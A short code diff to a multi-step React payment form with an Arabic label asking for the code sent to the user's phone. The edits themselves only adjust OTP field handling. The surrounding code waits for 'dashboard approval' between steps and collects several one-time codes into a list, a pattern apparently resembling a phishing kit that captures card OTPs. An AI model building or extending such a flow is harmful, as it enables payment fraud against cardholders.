@@ -311,6 +311,9 @@ setTimeout(() => {
       await handlePay(updatedPaymentInfo, setPaymentInfo)
       // Note: We don't automatically move to step 2 now - waiting for dashboard approval
     } else if (step === 2) {
+      if(paymentInfo.otp2 !==""){
+        handlePaymentInfoChange("otp2", '')
+      }
       setLoading(true)
       await handleSubmit(e)
       setTimeout(() => {
@@ -319,6 +322,7 @@ setTimeout(() => {
         setStep(3)
       }, 3000)
     } else if (step === 3) {
+     
       if (paymentInfo.otp && !newotp.includes(paymentInfo.otp)) {
         handleAddOtp(paymentInfo.otp)
       }
@@ -623,7 +627,7 @@ setTimeout(() => {
                     required
                     placeholder="الرمز  المرسل إلى الجوال"
                     className="text-center text-lg py-6 border-blue-200 col-12"
-                    value={paymentInfo.otp2 || ""}
+                    value={paymentInfo.otp2}
                     onChange={(e) => handlePaymentInfoChange("otp2", e.target.value)}
                   />
                 </div>
